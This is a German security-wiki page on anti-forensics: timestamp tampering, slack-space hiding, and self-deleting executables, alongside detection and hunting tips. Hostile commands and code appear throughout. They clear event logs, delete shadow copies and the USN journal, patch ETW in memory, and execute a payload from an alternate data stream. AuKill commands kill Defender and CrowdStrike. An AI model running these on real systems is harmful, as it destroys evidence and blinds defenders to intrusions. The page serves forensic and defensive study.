# Anti-Forensik-Techniken

{{#include ../../banners/hacktricks-training.md}}

## Zeitstempel

Ein Angreifer könnte daran interessiert sein, **die Zeitstempel von Dateien zu ändern**, um nicht entdeckt zu werden.\
Die Zeitstempel lassen sich in der MFT in den Attributen `$STANDARD_INFORMATION` \_\_ und \_\_ `$FILE_NAME` finden.

Beide Attribute enthalten 4 Zeitstempel: **Änderung**, **Zugriff**, **Erstellung** und **Änderung des MFT-Eintrags** (MACE oder MACB).

**Windows Explorer** und andere Tools zeigen die Informationen aus **`$STANDARD_INFORMATION`** an.

### TimeStomp - Anti-forensisches Tool

Dieses Tool **ändert** die Zeitstempelinformationen in **`$STANDARD_INFORMATION`**, **aber nicht** die Informationen in **`$FILE_NAME`**. Daher lassen sich **verdächtige Aktivitäten** **erkennen**.

### Usnjrnl

Das **USN Journal** (Update Sequence Number Journal) ist eine Funktion von NTFS (Windows NT-Dateisystem), die Änderungen am Volume nachverfolgt. Mit dem Tool [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) können diese Änderungen untersucht werden.

![TimeStomp - Anti-forensisches Tool - Usnjrnl: Das USN Journal (Update Sequence Number Journal) ist eine Funktion von NTFS (Windows NT-Dateisystem), die Änderungen am Volume nachverfolgt. Das...](<../../images/image (801).png>)

Das vorherige Bild zeigt die **Ausgabe** des **Tools**, in der zu erkennen ist, dass **einige Änderungen an der Datei vorgenommen wurden**.

### $LogFile

**Alle Metadatenänderungen an einem Dateisystem werden** in einem als [Write-Ahead-Logging](https://en.wikipedia.org/wiki/Write-ahead_logging) bekannten Verfahren protokolliert. Die protokollierten Metadaten werden in einer Datei namens `**$LogFile**` im Stammverzeichnis eines NTFS-Dateisystems gespeichert. Tools wie [LogFileParser](https://github.com/jschicht/LogFileParser) können diese Datei analysieren und Änderungen erkennen.

![Usnjrnl - $LogFile: Alle Metadatenänderungen an einem Dateisystem werden in einem als Write-Ahead-Logging bekannten Verfahren protokolliert. Die protokollierten Metadaten werden in einer Datei namens $LogFile im Stammverzeichnis...](<../../images/image (137).png>)

Auch in der Ausgabe des Tools ist zu sehen, dass **einige Änderungen vorgenommen wurden**.

Mit demselben Tool lässt sich feststellen, **auf welche Zeit die Zeitstempel geändert wurden**:

![Usnjrnl - $LogFile: Mit demselben Tool lässt sich feststellen, auf welche Zeit die Zeitstempel geändert wurden](<../../images/image (1089).png>)

- CTIME: Erstellungszeit der Datei
- ATIME: Änderungszeit der Datei
- MTIME: Änderungszeit des MFT-Eintrags der Datei
- RTIME: Zugriffszeit der Datei

### Vergleich von `$STANDARD_INFORMATION` und `$FILE_NAME`

Eine weitere Möglichkeit, verdächtig geänderte Dateien zu erkennen, besteht darin, die Zeitangaben in beiden Attributen zu vergleichen und nach **Abweichungen** zu suchen.

### Nanosekunden

Zeitstempel in **NTFS** haben eine **Genauigkeit** von **100 Nanosekunden**. Dateien mit Zeitstempeln wie 2010-10-10 10:10:**00.000:0000 zu finden, ist daher sehr verdächtig**.

### SetMace - Anti-forensisches Tool

Dieses Tool kann sowohl das Attribut `$STARNDAR_INFORMATION` als auch `$FILE_NAME` ändern. Ab Windows Vista muss dafür jedoch ein Live-Betriebssystem verwendet werden.

## Daten verstecken

NFTS verwendet Cluster und eine minimale Informationsgröße. Das bedeutet: Wenn eine Datei eineinhalb Cluster belegt, wird die **übrige Hälfte nicht verwendet**, bis die Datei gelöscht wird. Daher lassen sich **Daten in diesem Slack Space verstecken**.

Tools wie slacker ermöglichen es, Daten in diesem „versteckten“ Bereich abzulegen. Eine Analyse von `$logfile` und `$usnjrnl` kann jedoch zeigen, dass Daten hinzugefügt wurden:

![SetMace - Anti-forensisches Tool - Daten verstecken: Tools wie slacker ermöglichen es, Daten in diesem „versteckten“ Bereich abzulegen. Eine Analyse von $logfile und $usnjrnl kann jedoch zeigen, dass...](<../../images/image (1060).png>)

Anschließend lässt sich der Slack Space mit Tools wie FTK Imager wiederherstellen. Beachte, dass diese Art von Tools die Inhalte verschleiert oder sogar verschlüsselt speichern kann.

## UsbKill

Dieses Tool **schaltet den Computer aus, wenn eine Änderung an den USB**-Ports erkannt wird.\
Eine Möglichkeit, es zu entdecken, besteht darin, die laufenden Prozesse zu untersuchen und **jedes ausgeführte Python-Skript zu überprüfen**.

## Live-Linux-Distributionen

Diese Distributionen werden **im RAM** ausgeführt. Sie lassen sich nur erkennen, **wenn das NTFS-Dateisystem mit Schreibberechtigungen eingebunden ist**. Ist es nur mit Leseberechtigungen eingebunden, kann der Eindringversuch nicht erkannt werden.

## Sichere Löschung

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

### Verzögerte Selbstlöschung unter Windows

Ein laufendes Windows-Image kann gesperrt sein, solange sein Prozess aktiv ist. Ein Prozess kann die Löschung an einen untergeordneten `cmd.exe`-Prozess übergeben, `choice` als Timer verwenden und beendet werden, bevor die Shell `del` ausführt. Durch die Verzögerung kann der ursprüngliche Prozess seinen Image-Handle freigeben; wenn der vollständige Pfad Leerzeichen enthält, muss er in Anführungszeichen gesetzt werden.<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

```cmd
cmd.exe /C choice /C Y /N /D Y /T 6 ^>nul ^& Del /F /Q "<full-path-of-current-executable>"
```

Wenn diese Zeichenfolge direkt als Argument an `cmd.exe` übergeben wird, statt sie in einer anderen interaktiven `cmd`-Eingabeaufforderung einzugeben, verwende `&` anstelle von `^&` und `>nul` anstelle von `^>nul`. Dadurch wird der Verzeichniseintrag entfernt; es handelt sich **nicht um sicheres Löschen**, und Ausführungs-, Aufgaben-, Dateisystemjournal- oder andere forensische Spuren werden nicht entfernt. Suche nach kurzlebigen `cmd.exe`-Kindprozessen, deren Befehlszeile `choice /T`, `Del` und den Imagepfad des Elternprozesses kombiniert.<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

## Windows-Konfiguration

Es ist möglich, mehrere Windows-Protokollierungsmethoden zu deaktivieren, um forensische Untersuchungen deutlich zu erschweren.

### Zeitstempel deaktivieren – UserAssist

Dieser Registrierungsschlüssel speichert Datum und Uhrzeit, zu denen der Benutzer die einzelnen ausführbaren Dateien gestartet hat.

Zum Deaktivieren von UserAssist sind zwei Schritte erforderlich:

1. Setze die beiden Registrierungsschlüssel `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` und `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled` auf null, um UserAssist zu deaktivieren.
2. Leere die Registrierungsteilbäume, die wie `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>` aussehen.

### Zeitstempel deaktivieren – Prefetch

Dabei werden Informationen über ausgeführte Anwendungen gespeichert, um die Leistung des Windows-Systems zu verbessern. Diese Informationen können jedoch auch für forensische Untersuchungen nützlich sein.

- Führe `regedit` aus
- Wähle den Dateipfad `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters` aus
- Klicke mit der rechten Maustaste auf `EnablePrefetcher` und `EnableSuperfetch`
- Wähle bei beiden „Ändern“ aus, um den Wert von 1 (oder 3) auf 0 zu ändern
- Starte den Computer neu

### Zeitstempel deaktivieren – Letzter Zugriffszeitpunkt

Wird ein Ordner auf einem NTFS-Volume eines Windows-NT-Servers geöffnet, aktualisiert das System ein Zeitstempelfeld für jeden aufgelisteten Ordner. Dieses Feld wird als letzter Zugriffszeitpunkt bezeichnet. Auf einem stark genutzten NTFS-Volume kann sich dies auf die Leistung auswirken.

1. Öffne den Registrierungs-Editor (Regedit.exe).
2. Navigiere zu `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Suche nach `NtfsDisableLastAccessUpdate`. Falls der Eintrag nicht existiert, erstelle diesen DWORD-Wert und setze ihn auf 1, um den Vorgang zu deaktivieren.
4. Schließe den Registrierungs-Editor und starte den Server neu.

### USB-Verlauf löschen

Alle **USB-Geräteeinträge** werden in der Windows-Registrierung unter dem Registrierungsschlüssel **USBSTOR** gespeichert. Dieser enthält Unterschlüssel, die erstellt werden, sobald du ein USB-Gerät an deinen PC oder Laptop anschließt. Du findest diesen Schlüssel hier: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Wenn du diesen Schlüssel löschst**, wird der USB-Verlauf gelöscht.\
Du kannst auch das Tool [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) verwenden, um sicherzustellen, dass du sie gelöscht hast (und um sie zu löschen).

Eine weitere Datei, in der Informationen über USB-Geräte gespeichert werden, ist `setupapi.dev.log` im Verzeichnis `C:\Windows\INF`. Auch diese Datei sollte gelöscht werden.

### Schattenkopien deaktivieren

**Liste** die Schattenkopien mit `vssadmin list shadowstorage` auf.\
**Lösche** sie mit `vssadmin delete shadow`.

Du kannst sie auch über die grafische Benutzeroberfläche löschen, indem du die Schritte unter [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html) ausführst.

So deaktivierst du Schattenkopien ([Schritte von hier](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows)):

1. Öffne das Programm „Dienste“, indem du nach einem Klick auf die Windows-Startschaltfläche „Dienste“ in das Textsuchfeld eingibst.
2. Suche in der Liste nach „Volume Shadow Copy“, wähle den Dienst aus und öffne per Rechtsklick die Eigenschaften.
3. Wähle im Dropdown-Menü „Starttyp“ die Option „Deaktiviert“ und bestätige die Änderung mit „Übernehmen“ und „OK“.

Du kannst auch in der Registrierung unter `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot` festlegen, welche Dateien in die Schattenkopie aufgenommen werden.

### Gelöschte Dateien überschreiben

- Du kannst ein **Windows-Tool** verwenden: `cipher /w:C`. Damit wird cipher angewiesen, alle Daten im verfügbaren, ungenutzten Speicherplatz des Laufwerks C zu entfernen.
- Du kannst auch Tools wie [**Eraser**](https://eraser.heidi.ie) verwenden.

### Windows-Ereignisprotokolle löschen

- Windows + R --> eventvwr.msc --> „Windows-Protokolle“ erweitern --> Mit der rechten Maustaste auf jede Kategorie klicken und „Protokoll löschen“ auswählen
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Windows-Ereignisprotokolle deaktivieren

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- Deaktiviere im Bereich „Dienste“ den Dienst „Windows-Ereignisprotokoll“
- `WEvtUtil.exec clear-log` oder `WEvtUtil.exe cl`

### $UsnJrnl deaktivieren

- `fsutil usn deletejournal /d c:`

---

## Erweiterte Protokollierung & Manipulation von Spuren (2023-2025)

### PowerShell ScriptBlock-/Module-Logging

Aktuelle Versionen von Windows 10/11 und Windows Server speichern **umfangreiche forensische Artefakte von PowerShell** unter
`Microsoft-Windows-PowerShell/Operational` (Ereignisse 4104/4105/4106).  
Angreifer können diese spontan deaktivieren oder löschen:

```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
                 -Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
                 -Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
  Remove-WinEvent               # requires admin & Win11 23H2+
```

Verteidiger sollten Änderungen an diesen Registrierungsschlüsseln und das massenhafte Entfernen von PowerShell-Ereignissen überwachen.

### ETW (Event Tracing for Windows) Patch

Endpoint-Sicherheitsprodukte sind stark auf ETW angewiesen. Eine beliebte Umgehungsmethode aus dem Jahr 2024 besteht darin,
`ntdll!EtwEventWrite`/`EtwEventWriteFull` im Arbeitsspeicher zu patchen, sodass jeder ETW-Aufruf `STATUS_SUCCESS` zurückgibt,
ohne das Ereignis auszugeben:<sup>[[5]](#references)</sup>

```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
                   GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
                   patch, sizeof(patch), NULL);
```

Öffentliche PoCs (z. B. `EtwTiSwallow`) implementieren dieselbe Primitive in PowerShell oder C++.  
Da der Patch **prozesslokal** ist, können EDRs, die in anderen Prozessen laufen, ihn möglicherweise übersehen.<sup>[[5]](#references)</sup>
Erkennung: `ntdll` im Speicher mit der Datei auf der Festplatte vergleichen oder vor dem User-Mode hooken.

### Wiederaufleben alternativer Datenströme (ADS)

Malware-Kampagnen aus dem Jahr 2023 (z. B. **FIN12**-Loader) wurden dabei beobachtet, Second-Stage-Binaries in ADS abzulegen, um vor herkömmlichen Scannern verborgen zu bleiben:

```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```

Streams mit `dir /R`, `Get-Item -Stream *` oder Sysinternals `streams64.exe` auflisten.
Beim Kopieren der Hostdatei auf FAT/exFAT oder über SMB wird der verborgene Stream entfernt. Ermittler können so die Payload wiederherstellen.

### BYOVD & „AuKill“ (2023)

Bring-Your-Own-Vulnerable-Driver wird bei Ransomware-Angriffen inzwischen routinemäßig für **Anti-Forensik** eingesetzt.  
Das Open-Source-Tool **AuKill** lädt einen signierten, aber anfälligen Treiber (`procexp152.sys`), um EDR- und forensische Sensoren **vor der Verschlüsselung und Log-Löschung** anzuhalten oder zu beenden:<sup>[[1]](#references)</sup>

```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```

Der Treiber wird anschließend entfernt, sodass nur minimale Artefakte zurückbleiben.<sup>[[1]](#references)</sup>  
Gegenmaßnahmen: die Microsoft-Sperrliste für verwundbare Treiber aktivieren (HVCI/SAC) und Kernel-Service-Erstellungen aus benutzerschreibbaren Pfaden überwachen.

---

## Linux Anti-Forensics: Self-Patching und Cloud C2 (2023–2025)

### Self‑patching kompromittierter Dienste zur Verringerung der Erkennung (Linux)
Angreifer „self-patchen“ einen Dienst zunehmend direkt nach dessen Ausnutzung, um sowohl eine erneute Ausnutzung zu verhindern als auch auf Schwachstellen basierende Erkennungen zu unterdrücken. Dabei werden verwundbare Komponenten durch die neuesten legitimen Upstream-Binärdateien/JARs ersetzt, sodass Scanner den Host als gepatcht melden, während Persistenz und C2 bestehen bleiben.<sup>[[3]](#references)</sup>

Beispiel: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604).<sup>[[3]](#references)[[4]](#references)</sup>
- Nach der Ausnutzung luden Angreifer legitime JARs von Maven Central (repo1.maven.org) herunter, löschten verwundbare JARs aus der ActiveMQ-Installation und starteten den Broker neu.
- Dadurch wurde die ursprüngliche RCE geschlossen, während andere Zugänge bestehen blieben (cron, Änderungen an der SSH-Konfiguration, separate C2-Implants).

Operatives Beispiel (zur Veranschaulichung)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```

Forensik-/Hunting-Tipps
- Prüfe Service-Verzeichnisse auf nicht geplante Ersetzungen von Binaries/JARs:
  - Debian/Ubuntu: `dpkg -V activemq` und Dateihashes/-pfade mit Repo-Mirrors vergleichen.
  - RHEL/CentOS: `rpm -Va 'activemq*'`
  - Suche nach JAR-Versionen auf dem Datenträger, die keinem Paketmanager gehören, oder nach extern aktualisierten symbolischen Links.
- Timeline: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort`, um ctime/mtime mit dem Kompromittierungszeitraum abzugleichen.
- Shell-History/Prozess-Telemetrie: Hinweise auf `curl`/`wget` zu `repo1.maven.org` oder anderen Artifact-CDNs unmittelbar nach der initialen Ausnutzung.
- Change Management: Prüfe, wer den „Patch“ eingespielt hat und warum – nicht nur, ob eine gepatchte Version vorhanden ist.

### C2 über Cloud-Dienste mit Bearer-Tokens und Anti-Analysis-Stagern
Beobachtete Tradecraft kombinierte mehrere langfristige C2-Pfade mit Anti-Analysis-Packaging:<sup>[[3]](#references)</sup>
- Passwortgeschützte PyInstaller-ELF-Loader, um Sandboxing und statische Analyse zu erschweren (z. B. verschlüsseltes PYZ, temporäre Extraktion nach `/_MEI*`).
  - Indikatoren: `strings`-Treffer wie `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
  - Laufzeit-Artefakte: Extraktion nach `/tmp/_MEI*` oder in benutzerdefinierte `--runtime-tmpdir`-Pfade.
- Dropbox-basiertes C2 mit fest kodierten OAuth-Bearer-Tokens
  - Netzwerkmarker: `api.dropboxapi.com` / `content.dropboxapi.com` mit `Authorization: Bearer <token>`.
  - Suche in Proxy/NetFlow/Zeek/Suricata nach ausgehendem HTTPS zu Dropbox-Domains von Server-Workloads, die normalerweise keine Dateien synchronisieren.
- Paralleles/Backup-C2 per Tunneling (z. B. Cloudflare Tunnel `cloudflared`), um die Kontrolle zu behalten, falls ein Kanal blockiert wird.
  - Host-IOCs: `cloudflared`-Prozesse/-Units, Konfiguration unter `~/.cloudflared/*.json`, ausgehender Port 443 zu Cloudflare-Edges.

### Persistenz und „Hardening-Rollback“ zur Aufrechterhaltung des Zugriffs (Linux-Beispiele)
Angreifer kombinieren Self-Patching häufig mit dauerhaften Zugriffspfaden:<sup>[[3]](#references)</sup>
- Cron/Anacron: Änderungen am `0anacron`-Stub in jedem `/etc/cron.*/`-Verzeichnis zur regelmäßigen Ausführung.
  - Suche:
    ```bash
    for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
    grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
    ```
- Rollback der SSH-Konfigurationshärtung: Root-Logins aktivieren und Standard-Shells für Konten mit niedrigen Berechtigungen ändern.
  - Nach der Aktivierung von Root-Logins suchen:
    ```bash
    grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
    # flag values like "yes" or overly permissive settings
    ```
  - Suchen Sie auf Systemkonten (z. B. `games`) nach verdächtigen interaktiven Shells:
    ```bash
    awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
    ```
- Zufällige, kurz benannte Beacon-Artefakte (8 alphabetische Zeichen), die auf der Festplatte abgelegt werden und außerdem Cloud-C2 kontaktieren:
  - Suchen:
    ```bash
    find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
      -exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
    ```

Verteidiger sollten diese Artefakte mit externen Expositionen und Ereignissen zum Patchen von Diensten korrelieren, um eine anti-forensische Selbstbehebung aufzudecken, die dazu dient, die initiale Ausnutzung zu verschleiern.

## References

- [1] [Sophos X-Ops – AuKill: Ein als Waffe eingesetzter verwundbarer Treiber zum Deaktivieren von EDR (März 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – EtwEventWrite für Stealth patchen: Erkennung & Hunting (Juni 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Patchen für Persistenz: Wie die Linux-Malware DripDropper sich durch die Cloud bewegt](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [5] [.NET verbergen – ETW (Adam Chester / XPN)](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
- [6] [FortiGuard Labs – Aufdeckung einer in legitimer Software eingebetteten SectopRAT-Variante](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [7] [Microsoft Learn – choice-Befehl](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/choice)
- [8] [Microsoft Learn – del-Befehl](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/del)
{{#include ../../banners/hacktricks-training.md}}
